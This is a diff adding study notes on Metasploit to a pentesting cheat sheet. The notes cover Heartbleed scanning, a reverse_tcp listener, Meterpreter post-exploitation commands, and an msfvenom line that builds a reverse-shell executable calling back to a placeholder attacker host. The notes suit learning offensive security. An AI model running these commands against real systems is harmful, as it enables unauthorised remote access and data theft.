@@ -10,6 +10,143 @@ wireshark can use cracked passcodes to decrypt rest of traffic
 
 OSSINT tool for CLI
 
+## Metasploit
+
+Tool for generating exploit payload then using the payload
+
+Metasploit Modulus
+- Exploits - tools to take advantage of a system weakness
+- Payload - malicious code
+- Encoders - encoding code or information
+- Listeners - malicious code that hides in order to gain access ??
+- Shellcode - code that is programmed to activate when inside the target
+
+
+
+
+1) After scanning a system for vulnerabilities, choose the proper exploit
+2) Craft a payload that uses exploit
+3) Deliver payload
+
+Metasploit components
+- MSFconsole - main interface
+- Meterpreter - shell used after successful break in
+
+
+## Scanning computer for susceptibility of expoloit
+
+`msfconsole`
+
+msf5 `search heartbleed`
+
+msf5 `use auxiliary/scanner/ssl/openssl_heartbleed`
+
+msf5 auxiliary (scanner/ssl/openssl_heartbleed) `show options`
+
+msf5 auxiliary (scanner/ssl/openssl_heartbleed) `set RHOST 192.168.0.22` etc
+
+
+
+
+## Setup listener
+`msfconsole`
+
+`use exploit/multi/handler` common TCP handler
+
+`set payload windows/meterpreter/reverse_tcp` tell handler what payload is expected to hear from
+
+`show options`
+
+`set LHOST <our listener IP or DNS>` set the listener host address
+
+`set LPORT <port>` set the listener host port
+
+`exploit` turns on listener
+
+
+
+## Meterpreter Basics
+
+a common payload is `windows/meterpreter/reverse_tcp`
+
+`sessions` list open sessions
+
+`sessions -i <sessionID>` attach to a session
+
+`getuid` show user ID
+
+`getwd` show working directory
+
+`ifconfig` show network info
+
+`sysinfo` show system information
+
+`upload` upload a file to target
+
+`download` download a file from target
+
+`search` search for string
+
+`run win_privs` show windos privilege info
+
+`run win_enum` compreshensive suite of windows enumerations
+
+
+### Post module
+
+from meterpreter `post` then Tab Tab, to list post modules
+
+for example `post/windows/gather/` then Tab Tab, to list post/windows/gather modules
+
+try `post/windows/gather/enum_applications` to list applications installed
+
+### Shell
+
+`shell` to start a shell on remote host
+
+This shell is in many ways limited to what can be done including downloading
+
+This shell may also trigger notification of active shell sessions on remote machine
+
+
+
+### MSFvenom
+
+- create a custom payload
+- deliver payload somehow
+- setup listener on metasploit
+
+`msfvenom -p windows/meterpreter/reverse_tcp lhost=<attack IP or DSN> lport=<listening port> -f exe > hack.exe`
+
+`-f exe` set format of exploit
+
+`-p payload` set payload
+
+`-e encoder` sets an encoder
+
+`-a architecture` set a file architecture
+
+`-s` set max size of payload
+
+`-i` iterations to use on encoder
+
+`-x` custom executable file to use as template
+
+`-o` outfile of payload generation
+
+`-l` list available options for example `-l encoders` to list available encoders
+
+
+
+
+
+
+
+
+
+meterpreter `run post/<tab>` show post 
+
+
 ## Searchsploit
 
 offline database of exploit-db
